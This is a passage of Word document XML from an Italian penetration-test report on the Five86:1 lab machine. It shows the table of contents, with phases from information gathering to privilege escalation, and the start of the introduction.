              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7381B00D" w14:textId="604D7146" w:rsidR="003F27AD" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8296"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:b w:val="0"/>
              <w:bCs w:val="0"/>
              <w:caps w:val="0"/>
              <w:noProof/>
              <w:color w:val="auto"/>
              <w:kern w:val="2"/>
              <w:sz w:val="22"/>
              <w:u w:val="none"/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc139378614" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>4 Information Gathering</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378614 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="514BCC5F" w14:textId="71ADD18F" w:rsidR="003F27AD" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8296"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:b w:val="0"/>
              <w:bCs w:val="0"/>
              <w:caps w:val="0"/>
              <w:noProof/>
              <w:color w:val="auto"/>
              <w:kern w:val="2"/>
              <w:sz w:val="22"/>
              <w:u w:val="none"/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc139378615" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>5 Target Discovery</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378615 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="63EC36D8" w14:textId="00F073F4" w:rsidR="003F27AD" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8296"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:b w:val="0"/>
              <w:bCs w:val="0"/>
              <w:caps w:val="0"/>
              <w:noProof/>
              <w:color w:val="auto"/>
              <w:kern w:val="2"/>
              <w:sz w:val="22"/>
              <w:u w:val="none"/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc139378616" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>6 Enumerating Target e Port Scanning</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378616 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7800F09B" w14:textId="76FC1027" w:rsidR="003F27AD" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8296"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:b w:val="0"/>
              <w:bCs w:val="0"/>
              <w:caps w:val="0"/>
              <w:noProof/>
              <w:color w:val="auto"/>
              <w:kern w:val="2"/>
              <w:sz w:val="22"/>
              <w:u w:val="none"/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc139378617" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>7 Vulnerability Mapping</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378617 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="571B58FA" w14:textId="039DFBD1"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18" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>7.1 Analisi Automatica</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378618 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4F315399" w14:textId="67F6A7C7" w:rsidR="003F27AD" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8296"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:b w:val="0"/>
              <w:bCs w:val="0"/>
              <w:caps w:val="0"/>
              <w:noProof/>
              <w:color w:val="auto"/>
              <w:kern w:val="2"/>
              <w:sz w:val="22"/>
              <w:u w:val="none"/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc139378619" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>8 Target Exploitation</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378619 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3260FA30" w14:textId="7A358AC3"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20" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>8.1 Identifying Additional Vulnerabilities</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378620 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4D6AC29A" w14:textId="6E518CE6" w:rsidR="003F27AD" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="Sommario2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8296"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:b w:val="0"/>
              <w:bCs w:val="0"/>
              <w:smallCaps w:val="0"/>
              <w:noProof/>
              <w:color w:val="auto"/>
              <w:kern w:val="2"/>
              <w:sz w:val="22"/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc139378621" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>8.1 Privilege Escalation</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378621 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="05B6E3A2" w14:textId="13B86C82" w:rsidR="0010041E" w:rsidRPr="00AE4289" w:rsidRDefault="004A3D0B" w:rsidP="0010041E">
          <w:pPr>
            <w:rPr>
              <w:rFonts w:cs="Times New Roman"/>
            </w:rPr>
          </w:pPr>
          <w:r w:rsidRPr="00AE4289">
            <w:rPr>
              <w:rFonts w:cs="Times New Roman"/>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="7AE3D3FE" w14:textId="77777777" w:rsidR="0010041E" w:rsidRPr="00AE4289" w:rsidRDefault="0010041E" w:rsidP="0010041E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DA81596" w14:textId="77777777" w:rsidR="0010041E" w:rsidRDefault="0010041E" w:rsidP="0010041E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E0DAC39" w14:textId="77777777" w:rsidR="00AE4289" w:rsidRPr="00AE4289" w:rsidRDefault="00AE4289" w:rsidP="0010041E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B4EBFE5" w14:textId="6F3959AB" w:rsidR="007021DE" w:rsidRPr="00550195" w:rsidRDefault="0047127B" w:rsidP="00844D78">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:rPr>
          <w:color w:val="auto"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc139378594"/>
      <w:r w:rsidRPr="00550195">
        <w:rPr>
          <w:color w:val="auto"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Introduzione</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="34AB33F9" w14:textId="77777777" w:rsidR="00AE4289" w:rsidRPr="00B239BB" w:rsidRDefault="00AE4289" w:rsidP="00AE4289">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A324732" w14:textId="3CE64CF9" w:rsidR="00AE4289" w:rsidRPr="00B703CC" w:rsidRDefault="00AE4289" w:rsidP="00AE4289">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Lo scopo di questo documento è illustrare tutte le fasi che costituiscono l’attività di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>penetration</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> test eseguita sulla macchina </w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Five86:1</w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> per rendere riproducibile il processo. Lo scopo del progetto è identificare le vulnerabilità delle macchine e sfruttarle per valutarne la sicurezza. Questo documento è strutturato come segue: Nel secondo capitolo</w:t>
      </w:r>
      <w:r w:rsidR="00D36206">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">viene data una breve descrizione degli strumenti necessari </w:t>
      </w:r>
      <w:r w:rsidR="00D36206">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>all’</w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>implement</w:t>
      </w:r>
      <w:r w:rsidR="00D36206">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>azione</w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D36206">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>del</w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> progetto. Nelle sezioni seguenti, le metodo</w:t>
      </w:r>
      <w:r w:rsidR="00D36206">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>logie</w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> utilizzat</w:t>
      </w:r>
      <w:r w:rsidR="00D36206">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> sono </w:t>
      </w:r>
      <w:r w:rsidR="00D36206">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e segue</w:t>
      </w:r>
      <w:r w:rsidR="00D36206">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nti</w:t>
      </w:r>
      <w:r w:rsidRPr="00B703CC">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F19B82B" w14:textId="78AF90D7" w:rsidR="00AE4289" w:rsidRPr="00A82052" w:rsidRDefault="00AE4289">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Target </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Scoping</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1BE6F52D" w14:textId="6937A343" w:rsidR="00AE4289" w:rsidRPr="00A82052" w:rsidRDefault="00AE4289">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Information </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Gathering</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="30EEFBAA" w14:textId="70FC01E9" w:rsidR="00AE4289" w:rsidRPr="00A82052" w:rsidRDefault="00AE4289">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Target Discovery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3DB1CC" w14:textId="02A723AF" w:rsidR="00AE4289" w:rsidRPr="00A82052" w:rsidRDefault="00AE4289">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Enumerating</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Target e Port Scanning</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="702B2454" w14:textId="7B2CF313" w:rsidR="00AE4289" w:rsidRPr="00A82052" w:rsidRDefault="00AE4289">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Vulnerability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00A82052">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F7D1F71" w14:textId="260DA1EA" w:rsidR="00AE4289" w:rsidRPr="00A82052" w:rsidRDefault="00AE4289">
      <w:pPr>
